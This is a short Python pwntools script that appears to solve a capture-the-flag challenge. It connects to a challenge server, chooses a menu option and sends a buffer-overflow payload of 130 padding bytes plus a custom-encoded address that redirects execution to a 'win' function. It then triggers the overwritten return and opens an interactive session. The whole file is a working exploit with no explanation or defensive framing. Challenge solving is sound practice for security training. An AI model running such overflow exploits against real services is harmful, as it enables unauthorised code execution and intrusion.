import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')


def encode(s: str):
    assert len(s) % 2 == 0
    s = s[::-1]
    out = ''
    for i in range(0,len(s), 2):
        out += s[i+1] * ord(s[i])
    return out.encode('charmap')


r = remote(HOST, int(PORT))

r.sendlineafter(b'Choice:', b'1')

win_func = encode('\x03\x13\x3e\x23')

r.sendline(b'AB'*65 + win_func)

r.sendlineafter(b'Choice:', b'2')

r.interactive()
